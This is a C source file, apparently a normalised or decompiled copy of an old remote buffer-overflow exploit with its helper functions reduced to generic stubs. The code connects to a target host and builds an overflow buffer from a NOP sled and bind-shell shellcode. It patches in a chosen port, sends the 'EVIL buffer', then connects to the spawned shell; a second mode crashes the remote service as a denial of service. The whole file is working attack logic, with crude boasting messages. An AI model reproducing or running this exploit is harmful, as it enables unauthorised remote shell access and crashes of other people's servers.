#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {char* Xploit_way; int port; char* command; size_t overflow_string_size; } ;

/* Variables and functions */
 char NOP ; 
 int PORT_LOCATION ; 
 TYPE_1__* Xploiting_ways ; 
 int /*<<< orphan*/  FUNC0 (char*,int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (char*) ; 
 char* FUNC4 (int) ; 
 int FUNC5 (char*,int) ; 
 int /*<<< orphan*/  FUNC6 (int) ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 int /*<<< orphan*/  FUNC8 (int,char*) ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC9 (char*,char*) ; 
 size_t FUNC10 (char*) ; 

void
FUNC11(char *host, int type, int bind_shell_port)
{
 char *buf, *tmp;
 int sock, i, x, buffer_size, bindshell=bind_shell_port;
 unsigned char *ShellPortOffset;
 FUNC7("Type Number     : %d\n",type);
 FUNC7("Xploit way      : %s\n",Xploiting_ways[type].Xploit_way);
 FUNC7("Port            : %d\n",Xploiting_ways[type].port);
 FUNC7("Bind Shell Port : %d\n",bindshell);
 FUNC7("Let the show begin ladyes...\n");
 FUNC7("Connecting to %s [%d]...",host,Xploiting_ways[type].port);
 sock=FUNC5(host,Xploiting_ways[type].port);
 if (sock==-1)
 {
  FUNC7("FAILED!\n");
  FUNC7("Couldnt connect...leaving :|\n\n");
  FUNC2(-1);
 }
 FUNC7("SUCCESS!\n");
 FUNC7("Determinating buffer size...");
 buffer_size=(FUNC10(Xploiting_ways[type].command)
             +
             Xploiting_ways[type].overflow_string_size);
 FUNC7("DONE! (%d)\n",buffer_size);
 FUNC7("Allocating memory for buffer...");
 if (!(buf=FUNC4(buffer_size)))
 {
  FUNC7("FAILED!\n");
  FUNC7("Leaving... :[\n\n");
  FUNC2(-1);
 }
 FUNC7("WORKED!\n");
 FUNC7("Allocating memory for temp buffer...");
 if (!(tmp=FUNC4(Xploiting_ways[type].overflow_string_size)))
 {
  FUNC7("FAILED!\n");
  FUNC7("Leaving... :[\n\n");
  FUNC2(-1);
 }
 FUNC7("WORKED TO! (heh)\n");
 if (bindshell==0) // aka DoS (type > 0)
    FUNC0(tmp,Xploiting_ways[type].overflow_string_size);
 else // aka Xploit (type == 0)
 {
  for(i=0;
      i<Xploiting_ways[type].overflow_string_size-FUNC10(shellcode);
      i++) tmp[i]=NOP;
  // Now we inject the 16 byte port number on tha shellcode ;)
  ShellPortOffset = shellcode + PORT_LOCATION;
  bind_shell_port ^= 0x9999;
  *ShellPortOffset = (char) ((bind_shell_port >> 8) & 0xff);
  *(ShellPortOffset + 1) = (char) (bind_shell_port & 0xff);
  FUNC9(tmp,shellcode);
 }
 for(i=0;;i++)
  if ((Xploiting_ways[type].command[i]=='B') &&
      (Xploiting_ways[type].command[i+1]=='O')) break;
  else buf[i]=Xploiting_ways[type].command[i];
 FUNC9(buf,tmp);
 i+=2;
 for(;i<FUNC10(Xploiting_ways[type].command);i++)
    buf[FUNC10(buf)]=Xploiting_ways[type].command[i];
 FUNC7("Sending EVIL buffer ;)\n");
 FUNC8(sock,buf);
 FUNC1(sock);
 FUNC7("Freeing buffers...");
 FUNC3(buf);
 FUNC3(tmp);
 FUNC7("DONE!\n");
 // Lets test if it is a DoS or a Xploit again...
 if (bindshell>0)
 {
  FUNC7("Trying to binded'shell [%d]...",bindshell);
  sock=FUNC5(host,bindshell);
  if (sock==-1)
  {
   FUNC7("FAILED!\n");
   FUNC7("Too bad... :[ exiting...\n\n");
   FUNC2(-1);
  }
  FUNC7("W0RK3D! ;)\n");
  FUNC7("Prepare to have an orgazm...(or something like that *g*)\n");
  FUNC6(sock);
  FUNC7("I RULE!\n"); // Heh, nobody will ever'c thiz message, so why not? ;)
 }
 else
 {
  FUNC7("If the rem0te box was running a vulnerable version, it CRASHED =)\n");
  FUNC7("Regardz, wildcoyote@coders-pt.org\n\n");
 }
}